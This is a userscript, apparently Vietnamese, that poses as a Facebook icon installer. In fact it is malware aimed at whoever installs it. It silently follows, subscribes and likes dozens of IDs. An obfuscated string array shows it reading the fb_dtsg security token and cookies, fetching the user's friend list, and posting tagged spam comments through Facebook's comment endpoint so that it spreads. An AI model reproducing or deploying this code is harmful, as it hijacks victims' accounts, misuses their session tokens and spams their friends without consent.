// ==UserScript==
// @name            Cài Đặttt Icon FaceBook ( VER 3.0.14 )
...
P("271128943040996");
P("440002552769016");
sublist("226167937537097");
sublist("222330521254172");
// like boss
Like("530634390322184");Like("562211427187992");Like("141153419429130");
Like("250832635088035");Like("469869223130404");Like("239506482885148");Like("1431130167104656");
Like("396099813849307");Like("468423183267275");Like("171970182964950");
Like("682402031781825");Like("240256866156725");Like("637346166330335");


var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","440492819386656","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," (y) Mình Làm Được  Rồi🐔  🐯  🙏  🐑  🍂  🌴  🍎  🍓  🐷  👄  👀  💋  💘 có cả Tên Mới nhá :) :) :) Đẹp Quá Làm Thử Đi Nào 🐔  🐯  🙏  🐑  🍂  🌴  🍎  🍓  🐷  👄  👀  💋  💘  ^_^  @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
